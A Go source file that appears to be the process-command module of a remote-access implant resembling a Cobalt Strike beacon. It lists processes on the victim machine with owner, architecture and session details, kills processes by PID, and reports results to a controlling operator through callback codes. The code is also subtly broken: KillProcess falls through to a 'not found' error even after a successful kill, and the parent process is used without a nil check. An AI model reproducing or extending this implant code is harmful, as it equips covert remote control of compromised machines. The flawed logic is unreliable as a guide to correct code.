package command

import (
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/v3/process"
	"main/packet"
	"main/sysinfo"
	"strconv"
)

func ListProcess(pendingRequest []byte) error {
	processes, _ := process.Processes()
	result := ""
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		arch := sysinfo.GetProcessArch(uint32(pid))
		var archString string
		if arch == sysinfo.ProcessArch64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}
	// command line ps
	resultBytes := append(pendingRequest, []byte(result)...)
	if binary.BigEndian.Uint32(pendingRequest) == 0 {
		packet.PushResult(CALLBACK_PROCESS_LIST, resultBytes)
	} else {
		packet.PushResult(CALLBACK_PENDING, resultBytes)
	}
	return nil
}

func KillProcess(b []byte) error {
	pid := binary.BigEndian.Uint32(b)
	processes, err := process.Processes()
	if err != nil {
		return err
	}
	for _, p := range processes {
		if p.Pid == int32(pid) {
			err = p.Kill()
			if err != nil {
				return err
			}
			packet.PushResult(CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
		}
	}
	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
}
